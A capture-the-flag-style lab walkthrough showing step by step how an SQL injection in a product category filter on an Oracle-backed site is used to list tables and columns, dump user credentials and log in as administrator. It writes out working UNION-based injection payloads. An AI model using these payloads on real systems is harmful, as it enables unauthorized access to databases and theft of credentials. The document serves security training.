# Lab: SQL injection attack, listing the database contents on Oracle

## Description

* This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. *
*  The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. *
*   To solve the lab, log in as the administrator user. *

## HINT

*On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. *

*There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual* 
 
---

# STEP 1: Verify SQLi

Normal function of the catagory filter with the Gifts parameter

![image](https://user-images.githubusercontent.com/83407557/169707099-dd9392f2-58cd-47bd-b61f-2e9f7c69e046.png)

With a single quote

![image](https://user-images.githubusercontent.com/83407557/169707113-c9f09ea0-828a-4f44-a0ce-085f866a1a98.png)

and then with a comment

![image](https://user-images.githubusercontent.com/83407557/169707129-b88ddd3f-e529-4b6b-b28a-58511f6ae009.png)

---
# STEP 2: Determine the number of columns

Because I already know this is an Oracle database I can use the dual table as per the hint:

```sql
UNION SELECT NULL FROM dual
```

## Testing for a single column

![image](https://user-images.githubusercontent.com/83407557/169707224-330c73ea-50d5-43c9-834d-7f2284384010.png)

## Testing for 2 columns

![image](https://user-images.githubusercontent.com/83407557/169707265-425e6751-2364-4427-aa98-854a351ac0f3.png)

This tells me that there are 2 columns being returned in the query

---

# STEP 3: Determine which columns return string data

## Testing column 1

![image](https://user-images.githubusercontent.com/83407557/169707313-0552b0ba-8a0c-41af-915e-554a8bc01e48.png)

It does

## Testing for column 2

It also returns string data

![image](https://user-images.githubusercontent.com/83407557/169707339-8077469e-4b66-451d-96d7-6e14b8e3b5b4.png)

So either column will return string data

---

# STEP 4: Get a list of tables in the database

In oracle:

```sql
 SELECT * FROM all_tables
 
 or
 
 SELECT table_name FROM all_tables
 ```
 
 So to build the attack query:
 
 ```sql
 'UNION SELECT 'table name', table_name FROM all_tables--
 ```
 And then searching through the table names on the page, I find one I want to target: USERS_VPLXQY

 
 ![image](https://user-images.githubusercontent.com/83407557/169707658-70a95796-3995-4869-af98-ef6ce80576ab.png)

# STEP 5: Get a list of columns in the table USERS_VPLXQY

Since I know the table name, I can list the columns within that table with the following sql statement:

```sql
 SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS_VPLXQY' 
```

making the attack string

```sql
'UNION SELECT 'column name', column_name FROM all_tab_columns WHERE table_name = 'USERS_VPLXQY'--
```

And showing me the 2 columns PASSWORD_NIFASY and USERNAME_WNHNIW

![image](https://user-images.githubusercontent.com/83407557/169707992-52fd8ac4-e6e4-4b3a-9692-13433958eaf1.png)

# STEP 6: List users_vplxqy table rows

to list the row we need the table name and the column names which we have:

```sql
SELECT USERNAME_WNHNIW, PASSWORD_NIFASY FROM USERS_VPLXQY
```
making the attack 

```sql
'UNION SELECT USERNAME_WNHNIW, PASSWORD_NIFASY FROM USERS_VPLXQY--
```

![image](https://user-images.githubusercontent.com/83407557/169708154-ba0a3445-d011-4954-94e6-59fb6b948e7b.png)

---

# STEP 7: Log in as administrator

Since I found the password z2njdwm0dct95s5slqav inside the Oracle DB, I can use it to log in normally in my browser:

![image](https://user-images.githubusercontent.com/83407557/169708203-ac21dc68-ad3c-4ce6-9df0-f771220c36c8.png)
